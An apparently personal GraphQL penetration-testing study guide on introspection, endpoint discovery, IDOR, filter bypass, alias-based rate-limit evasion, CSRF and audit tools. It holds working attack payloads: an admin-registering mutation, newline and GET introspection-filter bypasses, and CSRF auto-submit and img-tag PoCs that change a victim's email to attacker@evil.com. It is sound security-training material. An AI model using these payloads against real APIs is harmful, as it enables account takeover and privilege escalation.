```
# 1. GraphQL API Vulnerabilities
## 1.1 - What is GraphQL
## 1.2 - How GraphQL Works
## 1.3 - What is a GraphQL schema
## 1.4 - What are GraphQL queries
## 1.5 - What are GraphQL mutations
## 1.6 - Building Blocks of Queries & Mutations
### 1. Fields
### 2. Arguments
### 3. Variables
### 4. Aliases
### 5. Fragments
## 1.7 - Subscriptions: Real-Time Updates
## 1.8 - Introspection: The API's Self-Documentation Feature
## 1.9 - Example Exploitation with Mutations
# 2. Finding GraphQL Endpoints
## 2.1 - Universal queries
## 2.2 - Common Endpoint Names to Try
## 2.3 - Try Different Request Methods
## 2.4 - Initial Testing Once Found
# 3. Exploiting Unsanitized Arguments
# 4. Discovering Schema Information


```



---

# 1. GraphQL API Vulnerabilities

### The Basic Idea

GraphQL APIs often have security holes because of how they're built or configured — not because GraphQL itself is inherently insecure. A common example: **introspection** (a built-in GraphQL feature that lets clients ask the API "what can you do?") is sometimes left turned on in production. This lets attackers map out the entire API schema — every query, field, and type — making it much easier to find something to exploit.

Attackers typically send crafted (malicious) requests to:
- **Steal data** they shouldn't have access to
- **Perform actions** they're not authorized to do (like changing settings or deleting records)

The consequences can be serious — especially if an attacker manages to escalate their privileges to admin level, either by cleverly manipulating queries or by combining the attack with something like CSRF (Cross-Site Request Forgery).

### Example: Introspection Query

If introspection is enabled, an attacker can send a request like this to discover the whole schema:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

This basically asks the API: *"List every data type and field you support."* Once an attacker has this map, they know exactly what queries/mutations exist — including ones that were never meant to be public.

### Example: Malicious Query for Unauthorized Data

Suppose there's a `user` query meant only to return your own profile, but it's not properly restricted:

```graphql
{
  user(id: 1) {
    username
    email
    isAdmin
  }
}
```

If access control isn't enforced properly, an attacker could just loop through `id` values (1, 2, 3, ...) and pull data on *every* user — a form of information disclosure.

### Example: Privilege Escalation via Mutation

```graphql
mutation {
  updateUser(id: 2, isAdmin: true) {
    id
    isAdmin
  }
}
```

If the API doesn't check whether the requester is actually allowed to modify other users, this single request could turn a regular account into an admin.

### In Short

| Issue | Why It's Dangerous |
|---|---|
| Introspection left on | Attackers can see the entire API "blueprint" |
| Weak access control on queries | Attackers can read data belonging to other users |
| Weak access control on mutations | Attackers can change data or escalate privileges |
| Combined with CSRF | Attacker can trick a logged-in admin's browser into making the malicious request for them |

---

## 1.1 - What is GraphQL

GraphQL is a way for a client (like a web or mobile app) to ask a server for exactly the data it needs — no more, no less. Unlike REST APIs, where you often get back a big fixed chunk of data or need to hit several different endpoints, GraphQL lets you request precisely what you want in a single call.

The client doesn't need to know *where* the data actually lives. It just sends a request, and the GraphQL server figures out how to fetch it.

---

## 1.2 - How GraphQL Works

Everything in GraphQL revolves around three types of operations:

| Operation | What it does | REST equivalent |
|---|---|---|
| **Query** | Reads/fetches data | GET |
| **Mutation** | Creates, updates, or deletes data | POST / PUT / DELETE |
| **Subscription** | Keeps a live connection open so the server can push updates in real time | WebSocket-based push |

A key difference from REST: **GraphQL uses just one single endpoint** (usually accessed via POST requests) for *all* operations. There's no `/users`, `/products`, `/orders` — everything goes through the same URL. What determines what happens is the *content* of the request (the operation type and name), not the endpoint or HTTP method.

The server always replies with a JSON object shaped just like what you asked for.

---

## 1.3 - What is a GraphQL schema

The **schema** defines everything the API can do — what data types exist, what fields they have, and how they relate to each other. Think of it as a contract between the client and the server.

Example schema for a "Book" type:

```graphql
type Book {
  id: ID!
  title: String!
  author: String!
  pages: Int
}
```

The `!` symbol means that field is **required** — it can't be empty.

Schemas must also include at least **one** available query. Usually, they also contain details of available mutations.

---

## 1.4 - What are GraphQL queries

A query is how you *read* data. You specify exactly which fields you want back.

```graphql
query getBookDetails {
  book(id: 42) {
    title
    author
  }
}
```

Even if the `Book` type has more fields (like `pages`), you'll only get back `title` and `author` — because that's all you asked for. This selective fetching is one of GraphQL's biggest advantages.

---

## 1.5 - What are GraphQL mutations

Mutations **create**, **update**, or **delete** data. They work like queries but always take some input.

```graphql
mutation {
  addBook(title: "Deep Work", author: "Cal Newport") {
    id
    title
  }
}
```

Response:

```json
{
  "data": {
    "addBook": {
      "id": "101",
      "title": "Deep Work"
    }
  }
}
```

---

## 1.6 - Building Blocks of Queries & Mutations

The GraphQL syntax includes several common components for queries and mutations. (`Fields`, `Arguments`, `Variables`, `Aliases`, `Fragments`)

```
GraphQL Operation (query or mutation)
├── Fields
│   └── Specify which data to return
│       └── Can be nested (e.g., user { id, name, posts { title } })
│
├── Arguments
│   └── Input values for fields
│       └── Inline (e.g., getUser(id: 1))
│       └── Or passed as variables
│
├── Variables
│   └── Externalized input passed with the request
│       ├── Declared in operation signature (e.g., $id: ID!)
│       └── Used in arguments (e.g., getUser(id: $id))
│
├── Aliases
│   └── Rename fields in response
│       └── Useful when querying same field with different args
│       └── Example: user1: getUser(id: 1), user2: getUser(id: 2)
│
└── Fragments
    └── Reusable field selections
        ├── Declared with `fragment`
        └── Included using `...fragmentName`
        └── Helps avoid repetition across multiple fields or types
```

### 1. Fields
The individual pieces of data you request. The response mirrors exactly what you asked for.

The example below shows a query to get ID and name details for all employees, and its associated response. In this case, `id`, `name.firstname`, and `name.lastname` are the fields requested.

```graphql
# Request Example:
query myGetEmployeeQuery {
  getEmployees {
    id
    name {
      firstname
      lastname
    }
  }
}
```

```json
# Response Example:
{
  "data": {
    "getEmployees": [
      {
        "id": 1,
        "name": {
          "firstname": "Carlos",
          "lastname": "Montoya"
        }
      },
      {
        "id": 2,
        "name": {
          "firstname": "Peter",
          "lastname": "Wiener"
        }
      }
    ]
  }
}
```

### 2. Arguments
Values passed to narrow down results — like filtering by an `ID`.

Example, a `getEmployee` request with an employee ID argument returns only that employee's details instead of all employees:

```graphql
# Example query with arguments:

query myGetEmployeeQuery {
    getEmployees(id:1) {
        name {
            firstname
            lastname
        }
    }
}
```

```json
# Response to query:

{
    "data": {
        "getEmployees": [
        {
            "name" {
                "firstname": Carlos,
                "lastname": Montoya
                }
            }
        ]
    }
}
```

⚠️ **Security note:** If an API blindly trusts an argument like `id` to fetch a specific record without checking whether *you're allowed to see it*, that's an **Insecure Direct Object Reference (IDOR)** vulnerability — you could just change the ID and view someone else's data.

### 3. Variables
Instead of hardcoding values into the query text, you can pass them separately from a `JSON` dictionary instead of inline values — useful for reusing the same query structure with different inputs.

To use variables:
- Declare the variable and type
- Add the variable name in the query
- Pass the variable key and value from the dictionary

```graphql
query getBook($id: ID!) {
  book(id: $id) {
    title
  }
}
```
```json
{ "id": 42 }
```

- In this example, the variable is declared in the first line with (`$id: ID!`).
- The `!` indicates that this is a required field for this query. It is then used as an argument in the second line with (`id:$id`).
- Finally, the value of the variable itself is set in the variable `JSON` dictionary.

### 4. Aliases
GraphQL won't let you request the same field twice in one query. For example, the following query is invalid because it tries to return the `product` type twice:
```graphql
# Invalid query:

query getProductDetails {
    getProduct(id: 1) {
        id
        name
    }
    getProduct(id: 2) {
        id
        name
    }
}
```

Aliases work around that by giving each result a custom name — letting you bundle multiple requests into a single call:
```graphql
# Valid query using aliases:

query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }
    product2: getProduct(id: "2") {
        id
        name
    }
}
```

```json
# Response to query:

{
    "data": {
        "product1": {
            "id": 1,
            "name": "Juice Extractor"
         },
        "product2": {
            "id": 2,
            "name": "Fruit Overlays"
        }
    }
}
```

⚠️ **Security note:** Because aliases let you cram multiple operations into one HTTP request, attackers can abuse them to **bypass rate limiting** — e.g., sending 100 login-guess mutations aliased inside a single request instead of 100 separate ones that would normally get throttled.

### 5. Fragments
Reusable chunks of fields you can drop into multiple queries — handy for keeping things DRY (Don't Repeat Yourself).

The example below shows a `getProduct` query in which the details of the product are contained in a `productInfo` fragment.

```graphql
# Example fragment:

fragment productInfo on Product {
    id
    name
    listed
}

# Query calling the fragment:

query {
    getProduct(id: 1) {
        ...productInfo
        stock
    }
}
```

```json
# Response including fragment fields:

{
    "data": {
        "getProduct": {
            "id": 1,
            "name": "Juice Extractor",
            "listed": "no",
            "stock": 5
        }
    }
}
```

---

## 1.7 - Subscriptions: Real-Time Updates

Subscriptions keep a connection open (typically via WebSockets) so the server can push updates to the client the moment something changes — great for chat apps, live dashboards, or collaborative editing tools.

---

## 1.8 - Introspection: The API's Self-Documentation Feature

Introspection lets you *ask the API about itself* — what types, fields, queries, and mutations it supports. It's meant for tools like GraphQL IDEs and auto-generated docs.

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

⚠️ **Security note:** This is a big one. If introspection is left enabled in a live production environment, an attacker can use it to map out the *entire* API — including hidden or sensitive fields/mutations that were never meant to be publicly known. Best practice: **disable introspection in production.**

---

## 1.9 - Example Exploitation with Mutations

Usually, we should start with identifying all **mutations** supported by the backend and their arguments. We will use the following introspection query:

```
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:

<img width="1127" height="588" alt="image" src="https://github.com/user-attachments/assets/85c29e72-8f34-4017-a80a-ee94c49c2280" />

We can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:

```
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

From the result, we can identify that we can provide the new user's `username`, `password`, `role`, and `msg`:

<img width="1121" height="592" alt="image" src="https://github.com/user-attachments/assets/81984aa7-d742-4f24-990c-d21fa95256e0" />

As we identified earlier, we need to provide the password as an MD5-hash. To hash our password, we can use the following command:

```
$ echo -n 'password' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -
```

With the hashed password, we can now finally register a new user by running the mutation:

```
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

In the result, we can see that the role admin is reflected, which indicates that the attack was successful:

<img width="1133" height="292" alt="image" src="https://github.com/user-attachments/assets/aafb4f57-2d5f-4fa4-8515-c577661d9c06" />

After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:

<img width="1141" height="407" alt="image" src="https://github.com/user-attachments/assets/ca661f00-94e7-4325-b4fa-0f9d8761de88" />

---

### Quick Recap: Where the Risk Comes From

| Feature | What it's for | How it can be abused |
|---|---|---|
| Introspection | Self-documentation | Reveals the entire API structure to attackers |
| Arguments (e.g. IDs) | Fetching specific records | IDOR — accessing other users' data |
| Aliases | Batching multiple operations | Bypassing rate limits (e.g., brute-forcing passwords) |
| Single endpoint + POST | Simplicity | Can make GraphQL requests vulnerable to CSRF if not protected |

---

# 2. Finding GraphQL Endpoints

Before you can test a GraphQL API for vulnerabilities, you first need to find its endpoint. This is especially valuable with GraphQL because — unlike REST — **every operation goes through a single endpoint**. Once you find it, you've found the doorway to the entire API.

> 💡 **Good to know:** Tools like Burp Scanner can automatically detect GraphQL endpoints for you during a scan (it flags them as "GraphQL endpoint found"). But it's still useful to understand how to find one manually.

---

## 2.1 - Universal queries

There's a simple query you can send to almost any suspected GraphQL endpoint to check if it's really GraphQL:

By sending `query{__typename}` to any GraphQL endpoint returns `{"data": {"__typename": "query"}}` in the response. This universal query helps identify GraphQL services, as `__typename` is a reserved field that returns the queried object's type as a string.

```
# Example request:

POST /graphql/v1 HTTP/2
Host: website.com
Cookie: session=asdasdasdasd
Content-Type: application/json

{
  "query": "query { __typename }"
}
```

```
# Expected Response:

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 45

{
  "data": {
    "__typename": "query"
  }
}

```

If the `expected response` is **returned**, its confirm that target website using `GraphQL`.

**Why this works:** every GraphQL API has a hidden, reserved field called `__typename`. It simply returns the *type* of whatever object you queried — as a string. Since this field always exists by default, it acts like a universal "knock on the door" to check if something is GraphQL.

---

## 2.2 - Common Endpoint Names to Try

GraphQL services tend to reuse the same handful of URL paths. When hunting for an endpoint, try sending the universal query above to each of these:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

If none of those work, try tacking `/v1` onto the end (e.g. `/graphql/v1`).

⚠️ **Watch out:** Many GraphQL servers respond to *any* malformed or non-GraphQL request with a generic error like `"query not present"`. Don't mistake that error for proof the endpoint *isn't* GraphQL — it might just mean your request wasn't formatted correctly.

---

## 2.3 - Try Different Request Methods

By default, well-configured GraphQL endpoints only accept:

- **Method:** `POST`
- **Content-Type:** `application/json`

This is intentional — it helps protect against CSRF attacks (more on that in a related doc).

However, some poorly configured endpoints are more lenient and might also accept:

- `GET` requests
- `POST` requests with `Content-Type: application/x-www-form-urlencoded`

**Example — universal query as a POST with JSON:**

```http
POST /graphql HTTP/1.1
Host: example.com
Content-Type: application/json

{"query": "query{__typename}"}
```

**Example — same query, but as a GET request:**

```http
GET /graphql?query=query{__typename} HTTP/1.1
Host: example.com
```

**Example — same query, but form-encoded:**

```http
POST /graphql HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

query=query{__typename}
```

If sending a standard `POST` + JSON request to the common endpoint names doesn't work, try these alternative methods before giving up.

---

## 2.4 - Initial Testing Once Found

Once you've confirmed a working GraphQL endpoint, start getting familiar with it:

- If it's powering a website's front end, browse the site normally (e.g., using Burp's browser).
- Watch the HTTP history/traffic — this reveals real queries and mutations the app actually sends, which is often the fastest way to learn what operations are available and how they're structured.


### Quick Recap

| Step | What to Do |
|---|---|
| 1. Test if it's GraphQL | Send `query{__typename}` and look for `"__typename"` in the response |
| 2. Try common paths | `/graphql`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql`, or add `/v1` |
| 3. Vary the request method | Try `POST` (JSON), then `GET`, then form-urlencoded `POST` if needed |
| 4. Explore the app | Browse the site and inspect HTTP traffic to see real queries in action |

---

# 3. Exploiting Unsanitized Arguments

Once you've found a GraphQL endpoint, a great place to start looking for bugs is in how it handles **arguments** — the values you pass in to filter or fetch specific data (like an `id`).

## The Core Problem

If an API uses an argument (like `id`) to fetch an object *directly*, without properly checking whether you're actually allowed to see that object, it's vulnerable to an **Insecure Direct Object Reference (IDOR)**.

In plain terms: if you can just guess or change an ID and the server hands over data it shouldn't, that's a broken access control bug.

---

## Example Walkthrough

Imagine an online shop. You send this query to list all products:

```graphql
query {
  products {
    id
    name
    listed
  }
}
```

You get back:

```json
{
  "data": {
    "products": [
      { "id": 1, "name": "Product 1", "listed": true },
      { "id": 2, "name": "Product 2", "listed": true },
      { "id": 4, "name": "Product 4", "listed": true }
    ]
  }
}
```

### Spot the Gap

Look closely at the IDs: `1, 2, 4`. **ID 3 is missing.**

Two useful inferences:
1. Product IDs are **sequential** (1, 2, 3, 4...) — meaning they're predictable.
2. Product 3 was probably **delisted** (hidden from public view) rather than deleted, since 4 still exists.

### Exploiting the Gap

Since the `product` query takes an `id` argument directly, nothing stops you from just... asking for ID 3 yourself:

```graphql
query {
  product(id: 3) {
    id
    name
    listed
  }
}
```

And the server happily responds:

```json
{
  "data": {
    "product": {
      "id": 3,
      "name": "Product 3",
      "listed": false
    }
  }
}
```

You've just retrieved a product that was intentionally hidden from the storefront — simply by supplying an ID that wasn't given to you. The API trusted the argument without checking if you *should* be allowed to see that specific record.

---

## Why This Matters

This same flaw pattern isn't limited to hidden products. Depending on the API, predictable/sequential IDs combined with missing access checks could expose far more sensitive things — other users' private data, unpublished content, internal records, etc. The underlying issue is always the same: **the server assumes that if you supply an ID, you're entitled to see it.**

---

# 4. Discovering Schema Information

Once you've found a GraphQL endpoint, the next step is figuring out what it can actually *do* — what data types exist, what queries/mutations are available, and how everything connects. The best tool for this is **introspection**.

## What Is Introspection

Introspection is a built-in GraphQL feature that lets you literally ask the server *"tell me about your own schema."* It's meant for legitimate tools like GraphQL IDEs and auto-generated docs — but it's just as useful (or dangerous) for anyone probing the API from the outside.

It can reveal:
- Every available query, mutation, and subscription
- All data types and their fields
- Sometimes even **description fields**, which can leak internal notes or sensitive hints

---

### Step 1: Probe — Is Introspection Even On?

Best practice says introspection should be **disabled** in production. But plenty of real-world APIs forget to turn it off. A quick, lightweight way to check is this small probe query:

```json
{
  "query": "{__schema{queryType{name}}}"
}
```

If introspection is enabled, you'll get back the name of the root query type — confirming it works, without pulling a ton of data yet.

> 💡 Tools like Burp Scanner can do this automatically and will flag it as a **"GraphQL introspection enabled"** issue if found.

---

### Step 2: Run the Full Introspection Query

If the probe succeeds, you can go big and request *everything* — every type, field, argument, and relationship the schema defines. This is the standard, comprehensive introspection query used across the industry:

```graphql
# Full introspection query:

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

This returns a complete map of the API: every query, mutation, subscription, type, and field — including ones that were never meant to be public.

> ⚠️ **Troubleshooting tip:** Some servers reject introspection queries that include the `onOperation`, `onFragment`, and `onField` directives. If your query fails, try removing those and re-running it.

---

### Step 3: Make Sense of the Results

Introspection responses are huge — often thousands of lines of nested JSON — and hard to read manually. A [GraphQL visualizer](https://nathanrandal.com/graphql-visualizer/) (an online tool) can turn that raw response into a diagram showing how types and operations relate to each other, making it much easier to spot interesting attack surface.

---

## What If Introspection Is Disabled? Try "Suggestions"

Even with introspection fully turned off, some GraphQL servers built on **Apollo** still leak schema info another way: through **helpful error messages**.

If you send a slightly-wrong field name, Apollo might respond with something like:

```
There is no entry for 'productInfo'. Did you mean 'productInformation' instead?
```

That single error message just confirmed a real field name exists — `productInformation` — even though you never saw it in a schema. By deliberately sending near-guesses and reading the "did you mean" suggestions, you can slowly reconstruct parts of the schema by trial and error.

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that automates this entire process — repeatedly guessing and reading suggestion errors to rebuild all or part of a schema automatically, without needing introspection enabled at all.

> 🛡️ **Defensive note:** In Apollo Server v4+, developers can disable this leaky behavior using the `hideSchemaDetailsFromClientErrors` option.

> 💡 Burp Scanner can also detect this automatically, flagging it as a **"GraphQL suggestions enabled"** issue.

---

## Quick Recap

| Technique | How It Works | Works Even If Introspection Is Off? |
|---|---|---|
| **Probe query** | Small query checks if introspection responds at all | ❌ No |
| **Full introspection query** | Pulls the entire schema — types, fields, queries, mutations | ❌ No |
| **Visualizer** | Turns messy introspection JSON into a readable diagram | ❌ No |
| **Suggestions abuse** | Deliberately mistyped queries trigger "did you mean...?" errors that leak real field/type names | ✅ Yes |
| **Clairvoyance** | Automates the suggestions technique to rebuild the schema | ✅ Yes |

---

# 5. Bypassing GraphQL introspection defenses

Some developers try to disable introspection by blocking any query containing the `__schema` keyword — usually using a **regex** (pattern matcher) to detect and reject it. The problem? These filters are often sloppy, and you can sneak past them with a couple of clever tricks.

## Trick 1: Sneak in "Invisible" Characters

GraphQL doesn't care about extra whitespace, newlines, or commas between keywords — it just ignores them when parsing the query. But a **poorly written regex might not be so forgiving**.

So if a developer's filter is specifically looking for the literal string `__schema{` (schema immediately followed by an opening brace, no space), you can defeat it just by sneaking a space, newline, or comma in between — GraphQL still understands the query perfectly, but the filter doesn't recognize it as a match.

**Example — sneaking a newline into the query:**

```json
{
  "query": "query{__schema\n{queryType{name}}}"
}
```

Notice the `\n` (newline) right after `__schema`. To GraphQL, this is identical to `__schema{...}` — completely valid. But to a naive regex looking for the exact string `__schema{`, it no longer matches, so the request sails through.

You could try the same trick with a space or comma too:

```json
{
  "query": "query{__schema,{queryType{name}}}"
}
```

## Trick 2: Switch Up the Request Method

Sometimes introspection is only blocked for **POST** requests — meaning the filter might not apply if you send the exact same query using a different method entirely, like **GET** or **POST with form-encoding** `x-www-form-urlencoded` instead of JSON.

**Example — the same introspection probe sent as a GET request, URL-encoded:**

```http
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

Decoded, this is just the same query as before, sent as URL parameters instead of a JSON body:

```
query{__schema
{queryType{name}}}
```

Same result — if the server's block was only configured for one method (say, POST), sending it via GET can slip right past.

---

# 6. Bypassing rate limiting using aliases

Normally, GraphQL won't let you request the same field twice in one query — it doesn't know how to label two identical results. **Aliases** solve this by letting you give each result a custom name, so you can ask for the same type of object multiple times in a single request.

This is genuinely useful for legitimate use — say, fetching two different products by ID in one round trip instead of two. But it also opens the door to abuse.

## Why This Breaks Rate Limiting

Most rate limiters count **HTTP requests** — e.g., "block this IP after 10 requests per minute." They usually *don't* look inside the request to count how many individual operations are packed into it.

Since aliases let you cram dozens (or hundreds) of queries into **one single HTTP request**, an attacker can effectively perform a large brute-force attack while only ever sending "1 request" as far as the rate limiter is concerned.

## Example: Brute-Forcing Discount Codes

Imagine a GraphQL API that checks whether a discount code is valid:

```graphql
query isValidDiscount($code: Int) {
  isValidDiscount(code: $code) {
    valid
  }
}
```

Normally, to brute-force many codes, you'd send this query repeatedly — once per code — which a rate limiter would eventually block.

Instead, using aliases, you can bundle multiple guesses into **one single request**:

```graphql
query isValidDiscount($code: Int) {
  isValidDiscount(code: $code) {
    valid
  }
  isValidDiscount2: isValidDiscount(code: $code) {
    valid
  }
  isValidDiscount3: isValidDiscount(code: $code) {
    valid
  }
}
```

Each aliased field (`isValidDiscount2`, `isValidDiscount3`, etc.) is really the *same* operation, just run again under a different label — and each can be checking a **different discount code value** in practice. To the server, this all arrives as **one HTTP request**, so a request-count-based rate limiter never notices anything unusual, even though dozens of checks just happened at once.

An attacker could scale this up to hundreds of aliases in a single request, checking hundreds of codes while technically staying under the radar of "X requests per minute" style protections.

---

# 7. GraphQL CSRF

**CSRF (Cross-Site Request Forgery)** is an attack where a malicious website tricks a victim's browser into sending a request to a *different* site — one the victim is already logged into — without the victim realizing it. Because the browser automatically attaches the victim's cookies/session, the target site thinks the request genuinely came from that logged-in user.

GraphQL isn't immune to this. If set up carelessly, an attacker can build a page that silently makes your browser fire off a GraphQL query or mutation *as you* — without you ever knowing.

## Why This Happens

The vulnerability boils down to two missing protections:

1. **No content-type validation** on the server
2. **No CSRF tokens** (a secret, unpredictable value the server checks to confirm the request came from a legitimate page, not a forged one)

### The Safe Case: JSON POST Requests

If a GraphQL endpoint **only** accepts `POST` requests with `Content-Type: application/json`, it's naturally protected — browsers simply **can't** be tricked into sending a JSON-typed request through normal HTML mechanisms (like a form or image tag) from another site. So even without CSRF tokens, this setup is relatively safe *as long as the server actually checks and enforces that content type*.

```http
POST /graphql HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{"query": "mutation { changeEmail(email: \"attacker@evil.com\") }"}
```
A malicious webpage **cannot** get a victim's browser to auto-send this exact request — browsers restrict cross-site JSON POSTs from things like plain HTML forms.

### The Dangerous Case: Other Methods/Content-Types

Problems appear when the endpoint is also willing to accept:

- **GET requests**, or
- **POST requests with `Content-Type: application/x-www-form-urlencoded`**

These *can* be triggered by a browser automatically, using nothing more than a plain HTML form or link — no fancy JavaScript needed.

**Example — malicious auto-submitting form hosted on an attacker's site:**

```html
<form action="https://vulnerable-website.com/graphql" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query" value="mutation { changeEmail(email: &quot;attacker@evil.com&quot;) }">
</form>
<script>
  document.forms[0].submit();
</script>
```

If the victim (already logged into `vulnerable-website.com`) simply visits the attacker's page, their browser auto-submits this form — silently changing their email to one the attacker controls, using the victim's own session cookies.

**Example — even simpler, via GET:**

```html
<img src="https://vulnerable-website.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22)}">
```

If the endpoint accepts GraphQL queries via `GET`, an attacker doesn't even need a form — just embedding this as an image tag can trigger the malicious mutation the instant the victim's browser loads the page.

---

# 8. Tools of trade

## 8.1 - graphw00f

After logging in to the sample web application and investigating all functionality, we can observe multiple requests to the `/graphql` endpoints that contain GraphQL queries:

<img width="1546" height="507" alt="image" src="https://github.com/user-attachments/assets/f45ccbc2-b20e-450a-8fd8-22c21f6033a3" />

Thus, we can definitively say that the web application implements **GraphQL**. As a first step, we will identify the `GraphQL engine` used by the web application using the tool `graphw00f`. 

`Graphw00f` will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.

After cloning the git repository, we can run the tool using the `main.py` Python script. We will run the tool in fingerprint (`-f`) and detect mode (`-d`). We can provide the web application's base URL to let graphwoof attempt to find the GraphQL endpoint by itself:

```
$ python3 main.py -d -f -t http://172.17.0.2

                +-------------------+
                |     graphw00f     |
                +-------------------+
                  ***            ***
                **                  **
              **                      **
    +--------------+              +--------------+
    |    Node X    |              |    Node Y    |
    +--------------+              +--------------+
                  ***            ***
                     **        **
                       **    **
                    +------------+
                    |   Node Z   |
                    +------------+

                graphw00f - v1.1.17
          The fingerprinting tool for GraphQL
           Dolev Farhi <dolev@lethalbit.com>
  
[*] Checking http://172.17.0.2/
[*] Checking http://172.17.0.2/graphql
[!] Found GraphQL at http://172.17.0.2/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

As we can see, the graphwoof identified the GraphQL engine Graphene. Additionally, it provides us with the corresponding detailed page in the `GraphQL-Threat-Matrix`, which provides more in-depth information about the identified GraphQL engine:

<img width="1252" height="427" alt="image" src="https://github.com/user-attachments/assets/150dc199-fca5-4fba-973e-6311a1d78d93" />

Lastly, by accessing the `/graphql` endpoint in a web browser directly, we can see that the web application runs a `graphiql` interface. This enables us to provide GraphQL queries directly, which is a lot more convenient than running the queries through Burp, as we do not need to worry about breaking the JSON syntax.

## 8.2 - GraphQL-Voyager

After using "general" introspection query that dumps all information about types, fields, and queries supported by the backend. 

The result of this query is quite large and complex. However, we can visualize the schema using the tool `GraphQL-Voyager`. For this module, we will use the `GraphQL Demo`. 

`However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves so that we can ensure that no sensitive information leaves our system.`

In the `demo`, we can click `CHANGE SCHEMA` and select `INTROSPECTION`. After pasting the result of the above introspection query in the text field and clicking on `DISPLAY`, the backend's GraphQL schema is visualized for us. We can explore all supported queries, types, and fields:

<img width="1259" height="589" alt="image" src="https://github.com/user-attachments/assets/55c68dd7-f395-4b55-a732-93da04df2e50" />

## 8.3 - GraphQL-Cop

We can use the tool `GraphQL-Cop`, a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the `graphql-cop.py` Python script:

```
$ python3 graphql-cop.py  -v

version: 1.13
```

We can then specify the GraphQL API's URL with the `-t` flag. GraphQL-Cop then executes multiple basic security configuration checks and lists all identified issues, which is a great baseline for further manual tests:

```
$ python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql

[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
[HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)
[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)
[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
[LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
[HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
```

## 8.4 - InQL

`InQL` is a **Burp** extension we can install via the `BApp Store` in Burp. After a successful installation, an `InQL` tab is added in Burp.

Furthermore, the extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:

<img width="1548" height="444" alt="image" src="https://github.com/user-attachments/assets/460f378c-3adb-46ea-bd69-cc5cde79d773" />

Furthermore, we can right-click on a GraphQL request and select `Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner`:

<img width="1541" height="455" alt="image" src="https://github.com/user-attachments/assets/f87042a8-f5df-43fd-8f9d-f469ac290baf" />

Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the `InQL` tab for the scanned host:

<img width="1402" height="608" alt="image" src="https://github.com/user-attachments/assets/0d0919b0-bcc8-4bd5-bb3a-7bf4f5850dce" />

---








































































































